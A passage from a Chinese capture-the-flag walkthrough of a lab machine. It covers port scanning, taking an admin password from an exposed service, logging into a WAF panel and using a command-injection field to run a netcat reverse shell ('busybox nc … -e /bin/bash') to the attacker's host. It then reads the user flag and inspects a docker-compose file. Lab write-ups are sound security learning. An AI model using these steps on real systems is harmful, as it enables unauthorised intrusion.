<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MazeSec-Cloud</title>
    <url>/2025/08/13/MazeSec-Cloud/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 192.168.43.154 -oA ports</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Cloud (192.168.43.154)</span><br><span class="line">Host is up (0.0045s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">666/tcp   open  doom</span><br><span class="line">9443/tcp  open  tungsten-https</span><br><span class="line">9455/tcp  open  unknown</span><br><span class="line">65443/tcp open  unknown</span><br><span class="line">MAC Address: 2A:A2:51:AE:EC:AD (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 4.40 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sT -sC -sV -O -p80,666,9443,9455,65443 192.168.43.154 -oA details</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:03 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Cloud (192.168.43.154)</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">80/tcp    open  http</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html;charset=utf-8).</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   GetRequest, HTTPOptions: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 466 </span></span><br><span class="line"><span class="string">|     Date: Thu, 14 Aug 2025 02:03:23 GMT</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=utf-8</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     Set-Cookie: sl-session=XFXkLmuVnmgLUlSv1uOrAw==; Path=/; Max-Age=86400; HttpOnly</span></span><br><span class="line"><span class="string">|_    &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;&lt;link rel=&quot;icon&quot; href=&quot;/.safeline/static/favicon.png&quot; type=&quot;image/png&quot;&gt;&lt;title id=&quot;slg-title&quot;&gt;&lt;/title&gt;&lt;style&gt;:root &#123;--primary-color:#0067B8;--light-primary-color:#0067B8cc;--font-color:#fff;--light-font-color:#ffffff80;--success-color:#00b87c;--warning-color:#ff6666;--warning-font-color:#fff;--warning-light-font-color:#ffffff80;&#125;&lt;/style&gt;&lt;style&gt;html&#123;height:100%&#125;body&#123;height:100%;margin:0;font-family:PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif&#125;#slg-bg&#123;background-color:var(--primary-color);z-index:100;width:100%;height:100%;position:fixed;inset:0&#125;#slg-box&#123;z-index:300;border-r</span></span><br><span class="line"><span class="string">666/tcp   open  http     nginx 1.18.0</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.18.0</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html).</span><br><span class="line">9443/tcp  open  ssl/http nginx</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent <span class="keyword">time</span></span><br><span class="line">| tls-alpn: </span><br><span class="line">|   h2</span><br><span class="line">|   http/1.1</span><br><span class="line">|   http/1.0</span><br><span class="line">|_  http/0.9</span><br><span class="line">|_http-title: SafeLine Waf Community Edition</span><br><span class="line">| ssl-cert: Subject: organizationName=Chaitin Co., Ltd./stateOrProvinceName=Beijing/countryName=CN</span><br><span class="line">| Not valid before: 2023-12-04T14:36:41</span><br><span class="line">|_Not valid after:  2123-11-10T14:36:41</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">9455/tcp  open  unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|     Unknown <span class="built_in">command</span>:</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|     Unknown <span class="built_in">command</span>: GET / HTTP/1.0</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|     Unknown <span class="built_in">command</span>: OPTIONS / HTTP/1.0</span><br><span class="line">|   NULL: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|_    Unknown <span class="built_in">command</span>: OPTIONS / RTSP/1.0</span><br><span class="line">65443/tcp open  unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, RPCCheck, RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Date: Thu, 14 Aug 2025 02:03:28 GMT</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 204</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">|     &lt;hr&gt;&lt;center&gt;tengine&lt;/center&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest, HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Date: Thu, 14 Aug 2025 02:03:28 GMT</span><br><span class="line">|     Content-Type: application/octet-stream</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|_    Connection: close</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|router</span><br><span class="line">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span><br><span class="line">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 161.40 seconds</span><br></pre></td></tr></table></figure>

<p>可以看到 80、666、9443、65443 四个端口似乎都是 web，9443 端口的title信息是 <strong>SafeLine Waf</strong> ,但最有趣的还是 9455 端口，暴露出来的信息是 <strong>Admin Server</strong> ，用 <code>nc</code> 连接 9455 端口看一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ nc 192.168.43.154 9455</span><br><span class="line">Welcome to Admin Service</span><br><span class="line">Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">Available commands:</span><br><span class="line">  <span class="built_in">help</span>          - Show this <span class="built_in">help</span></span><br><span class="line">  <span class="built_in">whoami</span>        - Show current user</span><br><span class="line">  system-status - Show system status</span><br><span class="line">  <span class="built_in">exit</span>          - Disconnect</span><br><span class="line"><span class="built_in">help</span></span><br><span class="line">Available commands:</span><br><span class="line">  <span class="built_in">help</span>          - Show this <span class="built_in">help</span></span><br><span class="line">  <span class="built_in">whoami</span>        - Show current user</span><br><span class="line">  system-status - Show system status</span><br><span class="line">  show-admin-pass - Show admin password</span><br><span class="line">  <span class="built_in">exit</span>          - Disconnect</span><br></pre></td></tr></table></figure>

<p>看上去是个自己搭建的对话程序，输入 <strong>help</strong> 之后，出现了一个有意思的 <strong>show-admin-pass</strong> 选项，输入这个命令之后，它返回了一个密码：<code>Admin Password: 5jRrRnE9</code>，可能这个密码在某个 web 的登录页面会用到。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>接下来看看 80 端口：</p>
<p><img src="image1.png" alt="image1"></p>
<p>是个雷池 WAF ，看样子现在还进不去。</p>
<p>想到前面信息收集的时候，9443 端口的 title 是 <strong>SafeLine WAF</strong> ，网上简单搜索一下也能知道，这个 <strong>SakeLien WAF</strong> 就是雷池 WAF，因此选择去 9443 端口看看：</p>
<p><img src="image2.png" alt="image2"></p>
<p>果然是个雷池 WAF 的登录页面，拿前面收集到的密码 <code>5jRrRnE9</code> 去登录 <code>admin</code> 账户：</p>
<p><img src="image3.png" alt="image3"></p>
<p>想到前面访问 80 端口的时候，页面显示被 WAF 拦住了，因此我们应该可以在这个雷池 WAF 的管理页面对 80 端口的访问情况进行一些修改。</p>
<p>把如下的 <code>维护模式</code> 改成 <code>观察模式</code>，想必 80 端口就可以访问了：</p>
<p><img src="image4.png" alt="image4"></p>
<p>然后再去访问 80 端口：</p>
<p><img src="image5.png" alt="image5"></p>
<p>访问之后发现域名变成了 <code>cloud.dsz</code>，那就加入 <strong>hosts</strong> 之后再去访问：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/hosts</span><br><span class="line"></span><br><span class="line">192.168.43.154 cloud.dsz</span><br></pre></td></tr></table></figure>

<p><img src="image6.png" alt="image6"></p>
<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>进去之后在 <code>选择检查项</code> 那里可以选择 <strong>自定义命令</strong> ，那就直接执行反弹 shell 就好了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">busybox nc 192.168.43.68 1234 -e /bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ nc -nvlp 1234         </span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.43.154 39804</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www-data@Cloud:~/html$</span><br></pre></td></tr></table></figure>

<p>在 <strong>&#x2F;home&#x2F;lucky</strong> 目录下，拿到了 user flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/home/lucky$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">www-data@Cloud:/home/lucky$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">flag&#123;user-72cfd272ace172fa35026445fbef9b03&#125;</span><br><span class="line">www-data@Cloud:/home/lucky$</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>同样在 <strong>&#x2F;home&#x2F;lucky</strong> 目录下，有一个 <code>.hint</code> 文件，但是我们无法查看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/home/lucky$ <span class="built_in">ls</span> -liah</span><br><span class="line"><span class="built_in">ls</span> -liah</span><br><span class="line">total 28K</span><br><span class="line">527366 drwxr-xr-x 2 lucky lucky 4.0K Aug 12 06:04 .</span><br><span class="line">523265 drwxr-xr-x 3 root  root  4.0K Aug 12 03:38 ..</span><br><span class="line">527367 -rw-r--r-- 1 lucky lucky  220 Aug 12 03:38 .bash_logout</span><br><span class="line">527368 -rw-r--r-- 1 lucky lucky 3.5K Aug 12 03:38 .bashrc</span><br><span class="line">530672 -rw------- 1 lucky lucky   45 Aug 12 06:04 .hint</span><br><span class="line">527369 -rw-r--r-- 1 lucky lucky  807 Aug 12 03:38 .profile</span><br><span class="line">530667 -rw-r--r-- 1 root  root    44 Aug 12 03:38 user.txt</span><br><span class="line">www-data@Cloud:/home/lucky$ <span class="built_in">cat</span> .hint</span><br><span class="line"><span class="built_in">cat</span> .hint</span><br><span class="line"><span class="built_in">cat</span>: .hint: Permission denied</span><br><span class="line">www-data@Cloud:/home/lucky$ </span><br></pre></td></tr></table></figure>

<p>因此我们需要想办法提权到 lucky 这个用户才行。</p>
<p>在根目录 <code>/</code> 下，我发现了一个比较多余的目录 <code>data</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:~$ <span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">www-data@Cloud:/$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin   dev   initrd.img      lib32   lost+found  opt   run   sys  var</span><br><span class="line">boot  etc   initrd.img.old  lib64   media       proc  sbin  tmp  vmlinuz</span><br><span class="line">data  home  lib             libx32  mnt         root  srv   usr  vmlinuz.old</span><br><span class="line">www-data@Cloud:/$</span><br></pre></td></tr></table></figure>

<p> 进到 <code>data</code> 目录里面查看，找到了一个 <code>docker-compose.yaml</code>，内容如下：</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"> <span class="attr">networks:</span></span><br><span class="line">  <span class="attr">safeline-ce:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">safeline-ce</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">default</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">gateway:</span> <span class="string">$&#123;SUBNET_PREFIX:?SUBNET_PREFIX</span> <span class="string">required&#125;.1</span></span><br><span class="line">          <span class="attr">subnet:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.0/24</span></span><br><span class="line">    <span class="attr">driver_opts:</span></span><br><span class="line">      <span class="attr">com.docker.network.bridge.name:</span> <span class="string">safeline-ce</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-pg</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-postgres$&#123;ARCH_SUFFIX&#125;:15.2</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/postgres/data:/var/lib/postgresql/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_USER=safeline-ce</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_PASSWORD=$&#123;POSTGRES_PASSWORD:?postgres</span> <span class="string">password</span> <span class="string">required&#125;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.2</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">postgres</span>, <span class="string">-c</span>, <span class="string">max_connections=600</span>]</span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> <span class="string">pg_isready</span> <span class="string">-U</span> <span class="string">safeline-ce</span> <span class="string">-d</span> <span class="string">safeline-ce</span></span><br><span class="line">  <span class="attr">mgt:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-mgt</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-mgt$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG:?image</span> <span class="string">tag</span> <span class="string">required&#125;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/mgt:/app/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/logs/nginx:/app/log/nginx:z</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/sock:/app/sock</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run:/app/run</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;MGT_PORT:-9443&#125;:1443</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> <span class="string">curl</span> <span class="string">-k</span> <span class="string">-f</span> <span class="string">https://localhost:1443/api/open/health</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MGT_PG=postgres://safeline-ce:$&#123;POSTGRES_PASSWORD&#125;@safeline-pg/safeline-ce?sslmode=disable</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">fvm</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">&quot;5&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.4</span></span><br><span class="line">  <span class="attr">detect:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-detector</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-detector$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/detector:/resources/detector</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/logs/detector:/logs/detector</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">LOG_DIR=/logs/detector</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.5</span></span><br><span class="line">  <span class="attr">tengine:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-tengine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-tengine$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/resolv.conf:/etc/resolv.conf:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/nginx:/etc/nginx</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/detector:/resources/detector</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/chaos:/resources/chaos</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/logs/nginx:/var/log/nginx:z</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/cache:/usr/local/nginx/cache</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/sock:/app/sock</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TCD_MGT_API=https://$&#123;SUBNET_PREFIX&#125;.4:1443/api/open/publish/server</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TCD_SNSERVER=$&#123;SUBNET_PREFIX&#125;.5:8000</span></span><br><span class="line">      <span class="comment"># deprecated</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SNSERVER_ADDR=$&#123;SUBNET_PREFIX&#125;.5:8000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CHAOS_ADDR=$&#123;SUBNET_PREFIX&#125;.10</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nofile:</span> <span class="number">131072</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">host</span></span><br><span class="line">  <span class="attr">luigi:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-luigi</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-luigi$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MGT_IP=$&#123;SUBNET_PREFIX&#125;.4</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">LUIGI_PG=postgres://safeline-ce:$&#123;POSTGRES_PASSWORD&#125;@safeline-pg/safeline-ce?sslmode=disable</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/luigi:/app/data</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">&quot;5&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">detect</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mgt</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.7</span></span><br><span class="line">  <span class="attr">fvm:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-fvm</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-fvm$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">&quot;5&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.8</span></span><br><span class="line">  <span class="attr">chaos:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-chaos</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-chaos$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">&quot;10&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_ADDR=postgres://safeline-ce:$&#123;POSTGRES_PASSWORD&#125;@safeline-pg/safeline-ce?sslmode=disable</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/sock:/app/sock</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/chaos:/app/chaos</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.10</span></span><br></pre></td></tr></table></figure>

<p>看上去是个 <code>safeline</code> 的 docker 配置文件，里面有个很重要的变量就是 <code>POSTGRES_PASSWORD</code>，因为它是个密码，找到之后我们可能可以进 <strong>PostgreSQL</strong> 里面找找信息，也可能存在密码复用的问题。</p>
<p>而这种 <code>$&#123;POSTGRES_PASSWORD&#125;</code> 形式的变量，一般要么在系统环境变量里面，要么在本地的 <code>.env</code> 文件里面。</p>
<p>查看本地文件：</p>
